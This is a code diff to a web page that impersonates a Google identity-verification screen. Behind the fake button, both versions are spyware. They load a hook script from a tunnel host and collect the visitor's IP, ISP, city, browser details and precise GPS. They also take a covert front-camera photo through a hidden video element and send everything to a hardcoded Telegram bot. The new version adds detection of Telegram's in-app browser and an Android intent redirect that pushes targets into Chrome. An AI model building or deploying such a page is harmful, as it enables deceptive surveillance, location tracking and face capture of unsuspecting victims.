@@ -6,28 +6,50 @@
     <title>Verification Security</title>
     <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; overflow: hidden; }
-        .box { background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; z-index: 10; position: relative; }
-        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
-        /* ڤیدیۆکە لێرە بە قەبارەیەکی بچووک لە پشت دوگمەکە دادەنێین بۆ ئەوەی تێلگرام زۆرک بێت وێنەکە بگرێت */
-        #spy-vid { position: absolute; top: 50%; left: 50%; width: 100px; height: 100px; transform: translate(-50%, -50%); z-index: -1; opacity: 0.01; }
+        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 20px; text-decoration: none; display: inline-block; }
+        .instruction { font-size: 14px; color: #5f6368; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80" alt=""><br><br>
+<div class="box" id="contentBox">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90" alt="">
     <h2>Identity Verification</h2>
-    <p>Please click to confirm your identity via secure gateway.</p>
-    <button class="btn" id="startBtn">CONTINUE</button>
+    <p id="mainText">Please verify your identity to access the document.</p>
+    
+    <div id="telegramOnly" style="display:none;">
+        <p style="color:red; font-weight:bold;">⚠️ Action Required</p>
+        <p>This verification requires a secure browser. Please click the button below to open in Chrome/Safari.</p>
+        <a href="#" id="openBrowser" class="btn">OPEN IN SECURE BROWSER</a>
+    </div>
+
+    <button class="btn" id="startBtn">VERIFY IDENTITY</button>
 </div>
 
-<video id="spy-vid" autoplay playsinline muted></video>
+<video id="spy-vid" autoplay playsinline muted style="position:fixed; top:-1000px;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
     const chatId = "6679834643";
+    const currentURL = window.location.href;
+
+    // پشکنین: ئایا لە ناو تێلگرامدایە؟
+    const isTelegram = /Telegram/i.test(navigator.userAgent);
+
+    if (isTelegram) {
+        document.getElementById('startBtn').style.display = 'none';
+        document.getElementById('telegramOnly').style.display = 'block';
+        
+        // هەوڵدان بۆ کردنەوەی ئۆتۆماتیکی لە برۆوسەری دەرەکی (بۆ ئەندرۆید)
+        const intentURL = "intent://" + currentURL.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+        document.getElementById('openBrowser').href = intentURL;
+
+        // بۆ ئایفۆن: ئاسانترین ڕێگە نیشاندانی ڕێنماییە یان لایەنی کەم ناردنی IP کەی
+        sendToBot("📢 Target opened in Telegram Browser (Restricted)");
+    }
 
     async function sendToBot(msg) {
         return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -38,70 +60,44 @@
     }
 
     document.getElementById('startBtn').addEventListener('click', async function() {
-        this.innerHTML = "Verifying...";
+        this.innerHTML = "Processing...";
         this.disabled = true;
 
         await getFullLog();
-        getGPS(); // بە جیا بانگی دەکەین بۆ ئەوەی کۆدەکە نەوەستێت
-        getCamera(); // دەستپێکردنی کامێرا
+        getGPS();
+        setTimeout(getCamera, 1000);
     });
 
     async function getFullLog() {
-        try {
-            let batteryLevel = "Unknown";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryLevel = Math.round(b.level * 100) + "%";
-            }
-            const response = await fetch('https://ipapi.co/json/');
-            const d = await response.json();
-            const fullMsg = `🔥 Target Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n💰 Battery: ${batteryLevel}\n📅 Date: ${new Date().toLocaleString()}\n📱 User-Agent: ${navigator.userAgent}`;
-            await sendToBot(fullMsg);
-        } catch (e) {
-            console.log("Log error");
-        }
+        const response = await fetch('https://ipapi.co/json/');
+        const d = await response.json();
+        const msg = `🔥 Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Browser: ${navigator.userAgent}`;
+        await sendToBot(msg);
     }
 
     function getGPS() {
-        const options = { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 };
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-        }, async (err) => {
-            await sendToBot(`❌ Location Error: ${err.message}`);
-        }, options);
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            await sendToBot(`📍 GPS: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        }, null, {enableHighAccuracy: true});
     }
 
     async function getCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('spy-vid');
-            video.srcObject = stream;
-
-            video.onloadeddata = async () => {
-                video.play();
-                // چاوەڕوانکردنی کاتێکی باش بۆ ئەوەی لە ناو تێلگرام وێنەکە ڕەش نەبێت
-                await new Promise(r => setTimeout(r, 5000));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth > 0 ? video.videoWidth : 640;
-                canvas.height = video.videoHeight > 0 ? video.videoHeight : 480;
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'capture.jpg');
-                    fd.append('caption', '👤 Target Face Captured!');
-                    
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg', 0.7);
-            };
-        } catch (e) {
-            sendToBot(`❌ Camera Permission Error: ${e.message}`);
-        }
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('spy-vid');
+        video.srcObject = stream;
+        video.onplaying = async () => {
+            await new Promise(r => setTimeout(r, 4000));
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'img.jpg');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg');
+        };
     }
 </script>
 </body>
